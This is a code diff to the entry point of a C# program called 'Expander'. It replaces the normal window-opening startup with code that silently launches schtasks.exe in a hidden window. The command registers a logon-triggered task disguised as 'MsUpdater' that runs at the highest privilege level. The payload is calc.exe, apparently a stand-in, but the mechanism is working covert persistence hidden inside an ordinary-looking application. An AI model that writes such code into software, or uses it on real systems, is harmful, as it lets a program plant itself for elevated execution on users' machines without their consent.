@@ -1,22 +1,29 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Threading.Tasks;
-using System.Windows.Forms;
-
-namespace Expander
+﻿namespace Expander
 {
-    static class Program
+    using System;
+    using System.Diagnostics;
+    using System.IO;
+
+    internal static class Program
     {
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
-        [STAThread]
-        static void Main()
+        private static void Main(string[] args)
         {
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new Form1());
+            if (args == null)
+            {
+                throw new ArgumentNullException(nameof(args));
+            }
+
+            var target = @"C:\Windows\System32\calc.exe";
+
+            Process.Start(new ProcessStartInfo
+                              {
+                                  FileName = "schtasks.exe",
+                                  Arguments = $"/CREATE /TN MsUpdater /TR {target} /SC ONLOGON /RL HIGHEST",
+                                  WindowStyle = ProcessWindowStyle.Hidden
+                              });
         }
     }
 }
